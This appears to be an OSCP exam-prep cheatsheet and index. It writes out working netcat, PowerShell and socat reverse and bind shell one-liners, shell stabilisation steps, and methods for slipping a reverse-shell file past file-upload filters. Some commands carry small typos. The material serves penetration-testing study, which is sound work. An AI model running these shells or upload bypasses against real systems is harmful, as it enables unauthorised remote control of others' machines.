# OSCP Preparation

## Cheatsheet
- [Linux Commands](OSCP%20Preparation/Cheatsheet/Linux-Commands.md)
- [Information Gathering and Vulnerability Scanning](OSCP%20Preparation/Cheatsheet/Information-Gathering-Vulnerability-Scanning.md)
- [Linux Privilege Escalation](OSCP%20Preparation/Cheatsheet/Linux-Priv-Esc.md)
- [Windows Privilege Escalation](OSCP%20Preparation/Cheatsheet/Windows-Priv-Esc.md)
- [Buffer Overflow](OSCP%20Preparation/Cheatsheet/Buffer-Overflow.md)
- [SQL Injection](OSCP%20Preparation/Cheatsheet/SQL-injection.md)
- [SQL Injection Cheatsheet](OSCP%20Preparation/Cheatsheet/SQLi-Cheatsheet.md)
- [Additional Helpful Commands](OSCP%20Preparation/Cheatsheet/Additional-Commands.md)
- [Port forwarding](OSCP%20Preparation/Cheatsheet/Port-Forwarding.md)

## Notes
[DNS Enumeration](OSCP%20Preparation/DNS%20Enumeration.md)

[Enumeration](OSCP%20Preparation/Enumeration.md)

[HackTheBox](OSCP%20Preparation/HackTheBox.md)

[TryHackMe machines](OSCP%20Preparation/TryHackMe%20machines.md)

[Five phases of hacking](OSCP%20Preparation/Five%20phases%20of%20hacking.md)

[Researching Potential Vulnerabilities](OSCP%20Preparation/Researching%20Potential%20Vulnerabilities.md)

[OWASP](OSCP%20Preparation/OWASP.md)

[Privilege Escalation](OSCP%20Preparation/Privilege%20Escalation.md)

[Linux Privilege Escalation](OSCP%20Preparation/Linux%20Privilege%20Escalation.md)

[Buffer Overflow](OSCP%20Preparation/Buffer%20Overflow.md)

[Active Directory](OSCP%20Preparation/Active%20Directory.md)

[msfvenom](OSCP%20Preparation/msfvenom.md)

[Windows](OSCP%20Preparation/Windows.md)

[SQL Injection](OSCP%20Preparation/SQLInjection.md)

[Post Exploitation](OSCP%20Preparation/Post-Exploitation.md)

## NetCat shells

- However, this is not included in most versions of netcat as it
  is widely seen to be very insecure (funny that, huh?). On Windows where a
  static binary is nearly always required anyway, this technique will
  work perfectly.
- On Linux, however, we would instead use this code to create a listener for a bind shell:

  `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; 1rm /tmp/f`

- A very similar command can be used to send a netcat reverse shell:

  `mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

- When targeting a modern Windows Server, it is very common to require a
  Powershell reverse shell, so we'll be covering the standard one-liner
  PSH reverse shell here.
- This command is very convoluted, so
  for the sake of simplicity it will not be explained directly here. It
  is, however, an extremely useful one-liner to keep on hand:

      `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream
       = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
      $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object
      -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback =
       (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' +
      (pwd).Path + '> ';$sendbyte =
      ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

### Stabilising

1. Technique 1 1

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm1

# we will background the shell using Ctrl + Z. Back in our own terminal we use
stty raw -echo; fg.
# This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
```

1. Technique 2

   - Using rlwrap

   ```bash
   rlwrap nc -lvnp <port>
   ```

   - Useful in stabilising windows shells 1

## Socat

### Reverse Shell

- `socat TCP-L:<port> -`
- As always with socat, this is taking two points (a listening port, and standard input) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to `nc -lvnp <port>`.
- On Windows we would use this command to connect back:
- `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`
- The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.
- This is the equivalent command for a Linux Target:
- `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -l`

### Bind Shell

- On a Linux target we would use the following command:
- `socat TCP-L:<PORT> EXEC:"bash -li"`
- On a Windows target we would use this command for our listener:
- `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
- We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.
- Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.
- `socat TCP:<TARGET-IP>:<TARGET-PORT> -`

### Some BurpSuite Extensions

- [Logger++](https://www.notion.so/470b7057b86f41c396a97903377f3d81) - Adds enhanced logging to all requests and responses from all Burp Suite tools, enable this one before you need it ;)
- [Request Smuggler](https://www.notion.so/aaaa60ef945341e8a450217a54a11646) - A relatively new extension, this allows you to attempt to smuggle
  requests to backend servers. See this talk by James Kettle for more
  details: [Link](https://www.youtube.com/watch?v=_A04msdplXs)
- [Autorize](https://www.notion.so/f9bbac8c4acf4aefa4d7dc92a991af2f) - Useful for authentication testing in web app tests. These tests
  typically revolve around navigating to restricted pages or issuing
  restricted GET requests with the session cookies of low-privileged users
- [Burp Teams Server](https://github.com/Static-Flow/BurpSuite-Team-Extension) - Allows for collaboration on a Burp project amongst team members. Project details are shared in a chatroom-like format
- [Retire.js](https://www.notion.so/36238b534a78494db9bf2d03f112265c) - Adds scanner checks for outdated JavaScript libraries that contain vulnerabilities, this is a premium extension
- [J2EEScan](https://www.notion.so/7ec6d429fed04cdcb6243d8ba7358880) - Adds scanner test coverage for J2EE (java platform for web development) applications, this is a premium extension
- [Request Timer](https://www.notion.so/56675bcf2a804d3096465b2868ec1d65) - Captures response times for requests made by all Burp tools, useful for discovering timing attack vectors

### Bypassing client side file upload filter

Posting the data directly to the page which contains the code for handling the file upload is another effective method for completely bypassing a client side filter. We will not be covering this method in any real depth in this tutorial, however, the syntax for such a command would look something like this:

```bash
curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>
```

### Bypassing server side file upload filter

**File Extensions**

- Find alternate extensions
- Try using multiple extension types
  - Ex: if .jpg is allowed then try uploading **shell.jpg.php**

**Using magic numbers**

- Find the magic number of the file types that are allowed
- Add n random characters at the beginning of the reverse-shell file (where n is the number of bytes in magic number)
- Using hexeditor change the n characters to the magic number

### Methodology for uploading vulnerabilities

1. The first thing we would do is take a look at the website as a whole. Using browser extensions such as the aforementioned Wappalyzer (or by hand) we would look for indicators of what languages and frameworks the web application might have been built with. Be aware that Wappalyzer is not always 100% accurate. A good start to enumerating this manually would be by making a request to the website and intercepting the response with Burpsuite. Headers such as `server` or `x-powered-by` can be used to gain information about the server. We would also be looking for vectors of attack, like, for example, an upload page.
2. Having found an upload page, we would then aim to inspect it further. Looking at the source code for client-side scripts to determine if there are any client-side filters to bypass would be a good thing to start with, as this is completely in our control.
3. We would then attempt a completely innocent file upload. From here we would look to see how our file is accessed. In other words, can we access it directly in an uploads folder? Is it embedded in a page somewhere? What's the naming scheme of the website? This is where tools such as Gobuster might come in if the location is not immediately obvious. This step is extremely important as it not only improves our knowledge of the virtual landscape we're attacking, it also gives us a baseline "accepted" file which we can base further testing on.
   - An important Gobuster switch here is the `x` switch, which can be used to look for files with specific extensions. For example, if you added `x php,txt,html` to your Gobuster command, the tool would append `.php`, `.txt`, and `.html` to each word in the selected wordlist, one at a time. This can be very useful if you've managed to upload a payload and the server is changing the name of uploaded files.
4. Having ascertained how and where our uploaded files can be accessed, we would then attempt a malicious file upload, bypassing any client-side filters we found in step two. We would expect our upload to be stopped by a server side filter, but the error message that it gives us can be extremely useful in determining our next steps.
